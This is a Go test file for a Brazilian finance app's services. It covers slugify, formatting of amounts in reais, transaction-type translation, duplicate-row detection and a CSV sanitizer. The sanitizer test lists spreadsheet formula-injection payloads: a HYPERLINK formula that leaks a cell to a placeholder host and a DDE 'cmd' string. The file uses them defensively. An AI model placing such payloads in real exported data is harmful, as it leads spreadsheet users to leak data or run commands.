package services

import (
	"strings"
	"testing"
	"time"

	"github.com/finance-sh/finance-sh/internal/entities"
	"github.com/finance-sh/finance-sh/internal/repositories"
	"github.com/finance-sh/finance-sh/pkg/imports"
	"github.com/stretchr/testify/assert"
)

func TestSlugify(t *testing.T) {
	cases := []struct {
		name    string
		in      string
		wantPre string // expected slug body before the "-<6hex>" random suffix
	}{
		{"simple", "Acme Inc", "acme-inc"},
		{"accents and symbols", "Família & Cia!!!", "fam-lia-cia"},
		{"trims dashes", "  --Hello World--  ", "hello-world"},
		{"empty falls back to org", "   ", "org"},
		{"only symbols falls back to org", "@@@###", "org"},
		{"numbers kept", "Org 2024", "org-2024"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := slugify(tc.in)
			// Format: "<wantPre>-<6 hex chars>".
			assert.True(t, strings.HasPrefix(got, tc.wantPre+"-"),
				"slug %q must start with %q-", got, tc.wantPre)

			suffix := strings.TrimPrefix(got, tc.wantPre+"-")
			assert.Len(t, suffix, 6, "random suffix is 6 hex chars (got slug %q)", got)
			for _, r := range suffix {
				assert.True(t, (r >= '0' && r <= '9') || (r >= 'a' && r <= 'f'),
					"suffix %q must be lowercase hex", suffix)
			}
		})
	}
}

func TestSlugifyUniqueSuffix(t *testing.T) {
	a := slugify("Acme")
	b := slugify("Acme")
	assert.NotEqual(t, a, b, "random suffix should make repeated slugs differ")
}

func TestReais(t *testing.T) {
	cases := []struct {
		cents int64
		want  string
	}{
		{0, "0,00"},
		{5, "0,05"},
		{50, "0,50"},
		{100, "1,00"},
		{123456, "1234,56"},
		{-1, "-0,01"},
		{-123456, "-1234,56"},
	}
	for _, tc := range cases {
		assert.Equal(t, tc.want, reais(tc.cents), "reais(%d)", tc.cents)
	}
}

func TestTranslateType(t *testing.T) {
	assert.Equal(t, "receita", translateType(entities.TxIncome))
	assert.Equal(t, "despesa", translateType(entities.TxExpense))
	assert.Equal(t, "transferência", translateType(entities.TxTransfer))
	// Unknown falls back to lower-cased raw value.
	assert.Equal(t, "unknown", translateType(entities.TransactionType("UNKNOWN")))
}

func TestCSVSafe(t *testing.T) {
	cases := map[string]string{
		"Mercado":                         "Mercado",
		"":                                "",
		`=HYPERLINK("http://x/?"&A1;"x")`: `'=HYPERLINK("http://x/?"&A1;"x")`,
		"+cmd|' /C calc'!A0":              "'+cmd|' /C calc'!A0",
		"-2+3":                            "'-2+3",
		"@SUM(A1)":                        "'@SUM(A1)",
		"\t=1":                            "'\t=1",
		"Pix de João = amigo":             "Pix de João = amigo",
	}
	for in, want := range cases {
		assert.Equal(t, want, csvSafe(in), in)
	}
}

func TestClassifyRowSignature(t *testing.T) {
	dia := time.Date(2026, 9, 1, 0, 0, 0, 0, time.UTC)
	assinaturas := map[string]bool{repositories.SignatureKey(dia.Add(15*time.Hour), 1000, "Mercado"): true}
	row := imports.ParsedRow{Date: dia, Description: "Mercado", AmountCents: 1000}
	dupe, _ := classifyRow(row, map[string]bool{}, map[string]bool{}, assinaturas)
	assert.True(t, dupe, "same day, amount and description is a duplicate")
	row.AmountCents = 1001
	dupe, _ = classifyRow(row, map[string]bool{}, map[string]bool{}, assinaturas)
	assert.False(t, dupe)
	row = imports.ParsedRow{Date: dia, Description: "Mercado", AmountCents: 1000, ExternalID: "x"}
	seen := map[string]bool{}
	dupe, _ = classifyRow(row, map[string]bool{}, seen, nil)
	assert.False(t, dupe)
	dupe, reason := classifyRow(row, map[string]bool{}, seen, nil)
	assert.True(t, dupe, "repeated external id in the same file")
	assert.Equal(t, "duplicado no arquivo", reason)
}
